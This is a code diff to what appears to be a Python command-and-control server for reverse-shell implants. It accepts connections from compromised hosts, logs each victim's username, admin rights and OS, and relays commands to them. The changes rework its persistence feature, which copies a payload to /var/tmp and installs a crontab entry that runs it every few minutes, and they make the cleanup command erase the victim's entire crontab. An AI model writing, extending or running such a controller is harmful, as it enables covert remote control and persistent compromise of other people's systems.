@@ -10,7 +10,6 @@ import shutil
 import platform
 import ipaddress
 import netifaces as ni
-import sys
 
 
 def banner():
@@ -55,12 +54,12 @@ def listener_handler():
     sock.bind((host_ip, int(host_port)))
     print(f'[*] Started listener on {host_ip} port {host_port}...\n')
     sock.listen()
-    t1 = threading.Thread(target=message_handler)
+    t1 = threading.Thread(target=connection_handler)
     t1.start()
 
 
-# Processing received connections details with 3 additional initial messages: Username, isAdmin, platform type and storing them into Sessions list.
-def message_handler():
+# Handle received connections details with 3 additional initial messages: Username, isAdmin, system type and storing them into Sessions list.
+def connection_handler():
     while True:
         if should_close_socket == True:
             break
@@ -68,7 +67,7 @@ def message_handler():
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
             admin = remote_target.recv(1024).decode()
-            platform = remote_target.recv(1024).decode()
+            system = remote_target.recv(1024).decode()
             if admin == '1':
                 isAdmin = 'Yes'
             elif username == 'root':
@@ -80,10 +79,12 @@ def message_handler():
             time_stamp = (
                 f"{date.month}/{date.day}/{date.year} {current_time}")
             sessions.append(
-                [remote_target, remote_ip[0], time_stamp, username, isAdmin, platform])
+                [remote_target, remote_ip[0], time_stamp, username, isAdmin, system])
             print(
                 f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
+
         except socket.error as e:
+            sock.close()
             if e.errno == 53:
                 print('Connection aborted')
             else:
@@ -136,13 +137,13 @@ def session_handler(session_id):
                     '[*] Enter the name of the python file in current directory to be add to persistence: ')
                 frequency = get_crontab_minutes(
                     '[*] Enter frequency for payload to execute in minutes (1-59): ')
-                message = f'cp ./{payload_name} /home/{sessions[num - 1][3]}/{payload_name}'
+                message = f'cp ./{payload_name} /var/tmp/{payload_name}'
                 session_id.send(message.encode())
                 response = inbound_message(session_id)
                 time.sleep(1)
                 if f'No such file' not in response:
                     print(response)
-                    message = f'echo "*/{frequency} * * * * python3 /home/{sessions[num - 1][3]}/{payload_name}" | crontab -'
+                    message = f'echo "*/{frequency} * * * * python3 /var/tmp/{payload_name}" | crontab -'
                     print(
                         f'[!] Trying to add {payload_name} to crontab. Please run <remove persistence> to clean up the crontab [!]')
                     session_id.send(message.encode())
@@ -151,7 +152,7 @@ def session_handler(session_id):
                     message = ''
             else:
                 print(
-                    f'No available persistence technique for {sessions[num - 1][5]} platform.')
+                    f'No available persistence technique for {sessions[num - 1][5]} system.')
                 message = ''
 
         if message == 'remove persistence':
@@ -162,17 +163,17 @@ def session_handler(session_id):
                 print(
                     f'[!] Make sure to remove the start-up binary: C:\\Users\\Public\\{payload_name} [!]')
             elif sessions[num - 1][5] == 'Linux':
-                message = f'crontab -l | grep -v "python3 /home/{sessions[num - 1][3]}/{payload_name}" | crontab -'
+                message = f'crontab -r'
                 session_id.send(message.encode())
                 response = inbound_message(session_id)
                 print('[!] Trying to clean up the crontab job [!]')
                 print(response)
                 print(
-                    f'[!] Make sure to remove payload file: /home/{sessions[num - 1][3]}/{payload_name} [!]')
+                    f'[!] Make sure to remove payload file from: /var/tmp/ directory [!]')
                 message = ''
             else:
                 print(
-                    f'No available persistence removal technique for {sessions[num - 1][5]} platform.')
+                    f'No available persistence removal technique for {sessions[num - 1][5]} system.')
                 message = ''
 
         if not message:
@@ -272,7 +273,7 @@ if __name__ == '__main__':
                 if command.split(' ')[1] == '-l':
                     table = PrettyTable()
                     table.field_names = ['Session', 'Status', 'Username', 'Admin',
-                                         'Target', 'OS Platform', 'Connection Time']
+                                         'Target', 'OS System', 'Connection Time']
                     table.padding_width = 2
                     for target in sessions:
                         table.add_row(
@@ -299,6 +300,5 @@ if __name__ == '__main__':
             print('\n[-] Keyboard interrupt issued.')
             should_close_socket = True
             sock.close()
-            break
         except Exception as e:
             print(e)
